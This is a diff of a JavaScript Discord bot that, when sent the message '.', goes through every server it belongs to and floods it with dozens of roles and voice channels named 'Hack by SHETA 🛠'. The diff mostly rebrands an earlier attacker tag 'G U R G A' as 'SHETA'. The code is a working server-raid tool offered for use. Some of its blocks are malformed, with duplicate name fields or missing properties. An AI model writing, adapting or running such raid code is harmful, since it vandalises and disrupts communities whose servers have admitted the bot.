@@ -81,82 +81,82 @@ LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
   m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
            m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -166,444 +166,481 @@ LOka.on('message', message => {
         color : " #ff0000"
     })
    m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    
-   m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-           m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
    
     m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    
+   m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    
+   m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
         name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by G̷ U̷ R̷ G̷ A̷ 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    
+   m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+   
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    
+   m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+      
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    
+   m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+           m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hack by SHETA 🛠",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+   
+    m.createRole({
+        name : "Hack by SHETA 🛠",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -697,29 +734,29 @@ m.createChannel('Hack by SHETA 🛠', 'voice');
 m.createChannel('Hack by SHETA 🛠', 'voice');
 m.createChannel('Hack by SHETA 🛠', 'voice');
 m.createChannel('Hack by SHETA 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
-m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by  SHETA̷ 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
+m.createChannel('Hack by SHETA 🛠', 'voice');
